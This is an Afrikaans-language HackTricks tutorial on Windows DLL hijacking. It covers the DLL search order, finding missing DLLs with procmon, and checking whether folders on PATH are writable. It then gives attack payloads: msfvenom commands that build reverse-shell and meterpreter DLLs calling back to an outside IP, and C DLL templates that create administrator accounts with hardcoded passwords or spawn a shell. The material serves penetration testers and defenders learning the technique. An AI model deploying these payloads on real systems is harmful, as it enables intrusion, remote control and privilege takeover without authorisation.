# Dll Kaping

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin verdien belonings tot **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basiese Inligting

DLL Kaping behels die manipulering van 'n vertroude toepassing om 'n skadelike DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir kode-uitvoering, bereiking van volharding, en, minder algemeen, voorreg-escalasie. Ten spyte van die fokus op escalasie hier, bly die metode van kaping konsekwent oor doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL-kaping, elk met sy doeltreffendheid afhanklik van die toepassing se DLL-laai-strategie:

1. **DLL Vervanging**: Die ruiling van 'n ware DLL met 'n skadelike een, opsioneel met die gebruik van DLL Proxying om die funksionaliteit van die oorspronklike DLL te behou.
2. **DLL Soekorde Kaping**: Die plaas van die skadelike DLL in 'n soekpad voor die regmatige een, wat die toepassing se soekpatroon benut.
3. **Spook DLL Kaping**: Die skep van 'n skadelike DLL vir 'n toepassing om te laai, dinkende dit is 'n nie-bestaande vereiste DLL.
4. **DLL Aanstuur**: Die wysiging van soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die skadelike DLL te rig.
5. **WinSxS DLL Vervanging**: Die vervanging van die regmatige DLL met 'n skadelike eweknie in die WinSxS-gids, 'n metode wat dikwels geassosieer word met DLL side-loading.
6. **Relatiewe Pad DLL Kaping**: Die plaas van die skadelike DLL in 'n gebruikerbeheerde gids saam met die gekopieerde toepassing, wat lyk na Binêre Proxy Uitvoeringstegnieke.

## Vind van ontbrekende Dlls

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is deur [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) vanaf sysinternals te hardloop, **stel** die **volgende 2 filters** in:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

en wys net die **Lêersisteemaktiwiteit**:

![](<../../.gitbook/assets/image (314).png>)

As jy op soek is na **ontbrekende dlls in die algemeen** moet jy dit vir 'n paar **sekondes laat loop**.\
As jy op soek is na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer** moet jy 'n **ander filter instel soos "Prosesnaam" "bevat" "\<uitvoernaam>", voer dit uit, en stop die vaslegging van gebeure**.

## Uitbuiting van Ontbrekende Dlls

Om voorregte te eskaleer, is die beste kans wat ons het om in staat te wees om 'n dll te skryf wat 'n voorregproses sal probeer laai in 'n plek waar dit gaan word soek. Daarom sal ons in staat wees om 'n dll te skryf in 'n **gids** waar die **dll voor die oorspronklike dll gesoek word** (vreemde geval), of ons sal in staat wees om **te skryf op 'n gids waar die dll gaan soek word** en die oorspronklike **dll bestaan nie** in enige gids nie.

### Dll Soekorde

Binne die [**Microsoft-dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word**.

**Windows-toepassings** soek na DLLs deur 'n reeks **voorafbepaalde soekpaaie** te volg, in ooreenstemming met 'n spesifieke volgorde. Die probleem van DLL-kaping ontstaan wanneer 'n skadelike DLL strategies in een van hierdie gids geplaas word, om te verseker dat dit gelaai word voordat die egte DLL. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paaie gebruik wanneer verwys word na die DLLs wat dit benodig.

Jy kan die **DLL-soekorde op 32-bietjie** stelsels hieronder sien:

1. Die gids waaruit die toepassing gelaai is.
2. Die stelselgids. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funksie om die pad van hierdie gids te kry.(_C:\Windows\System32_)
3. Die 16-bietjie stelselgids. Daar is geen funksie wat die pad van hierdie gids kry nie, maar dit word gesoek. (_C:\Windows\System_)
4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funksie om die pad van hierdie gids te kry.
1. (_C:\Windows_)
5. Die huidige gids.
6. Die gidse wat in die PATH-omgewingsveranderlike gelys is. Let daarop dat dit nie die per-toepassing-gids insluit wat deur die **App Paths**-register sleutel gespesifiseer is nie. Die **App Paths** sleutel word nie gebruik wanneer die DLL-soekpad bereken word nie.

Dit is die **verstek** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer word, eskaleer die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit in op 0 (verstek is geaktiveer).

As [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie geroep word met **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** begin die soektog in die gids van die uitvoerbare module wat **LoadLibraryEx** laai.

Laastens, let daarop dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam**. In daardie geval gaan daardie dll **net in daardie pad gesoek word** (as die dll enige afhanklikhede het, gaan hulle gesoek word soos net deur naam gelaai).

Daar is ander maniere om die soekorde te verander maar ek gaan dit nie hier verduidelik nie.
#### Uitsluitings op dll-soekvolgorde vanaf Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekvolgorde word genoteer in die Windows-dokumentasie:

- Wanneer 'n **DLL wat sy naam deel met een wat reeds in die geheue gelaai is**, aangetref word, omseil die stelsel die gewone soektog. In plaas daarvan, voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit verstek na die reeds in die geheue gelaai DLL gaan. **In hierdie scenario, doen die stelsel nie 'n soektog vir die DLL nie**.
- In gevalle waar die DLL erken word as 'n **bekende DLL** vir die huidige Windows-weergawe, sal die stelsel sy weergawe van die bekende DLL gebruik, saam met enige van sy afhanklike DLL's, **om die soekproses te vermy**. Die register sleutel **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie bekende DLL's.
- Indien 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLL's uitgevoer asof hulle slegs deur hul **module name** aangedui is, ongeag of die aanvanklike DLL deur 'n volledige pad geïdentifiseer is.

### Voorregte Eskalasie

**Vereistes**:

- Identifiseer 'n proses wat onder **verskillende voorregte** werk of sal werk (horisontale of laterale beweging), wat 'n **DLL kortkom**.
- Verseker dat **skryftoegang** beskikbaar is vir enige **gids** waarin die **DLL** gesoek sal word. Hierdie plek kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.

Ja, die vereistes is moeilik om te vind aangesien **dit by verstek nogal vreemd is om 'n bevoorregte uitvoerbare lêer sonder 'n dll te vind** en dit is selfs **meer vreemd om skryftoestemmings op 'n stelselpadgids te hê** (jy kan dit nie by verstek hê nie). Maar, in verkeerd gekonfigureerde omgewings is dit moontlik.\
In die geval dat jy gelukkig is en jy vind dat jy aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **hoofdoel van die projek om UAC te omseil**, kan jy daar 'n **PoC** van 'n Dll-hacking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy skryftoestemmings het, te verander).

Merk op dat jy jou toestemmings in 'n gids kan **nagaan deur** die volgende te doen:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die regte van alle lêers binne die PAD**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die invoere van 'n uitvoerbare lêer en die uitvoere van 'n dll kontroleer met:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** met toestemmings om in 'n **Sisteempad-vouer te skryf** kyk:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Geoutomatiseerde gereedskap

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal nagaan of jy skryfregte het op enige vouer binne die sisteem PAD.\
Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit-funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

In die geval dat jy 'n uitbuitbare scenario vind, sal een van die belangrikste dinge om dit suksesvol uit te buit wees om **'n dll te skep wat ten minste al die funksies uitvoer wat die uitvoerbare lêer daarvan sal invoer**. In elk geval, let daarop dat Dll Hijacking handig is om [te eskaleer van Medium Integriteitsvlak na Hoë **(UAC omseil)**](../authentication-credentials-uac-and-efs.md#uac) of van [**Hoë Integriteit na SISTEEM**](./#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n geldige dll te skep** binne hierdie dll-hijacking-studie wat gefokus is op dll-hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder, in die **volgende afdeling** kan jy 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll met nie-verpligte funksies uitgevoer** te skep.

## **Dlls Skep en Kompilering**

### **Dll Proksifisering**

Basies is 'n **Dll-proksi** 'n Dll wat in staat is om **jou skadelike kode uit te voer wanneer dit gelaai word** maar ook om **bloot te lê** en **te werk** soos **verwag** deur **alle oproepe na die werklike biblioteek te relayeer**.

Met die gereedskap [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare lêer aandui en die biblioteek kies** wat jy wil proksifiseer en **'n geproksifiseerde dll genereer** of **die Dll aandui** en **'n geproksifiseerde dll genereer**.

### **Meterpreter**

**Kry rev-skaal (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 Ek het nie 'n x64 weergawe gesien nie):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let daarop dat in verskeie gevalle die Dll wat jy saamstel, **veral verskeie funksies moet uitvoer** wat deur die slagofferproses gelaai gaan word, as hierdie funksies nie bestaan nie, sal die **binêre lêer nie in staat wees om hulle te laai** en die **uitbuiting sal misluk**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Verwysings

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bugsbounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bugsbounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings tot **$100,000** te verdien!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
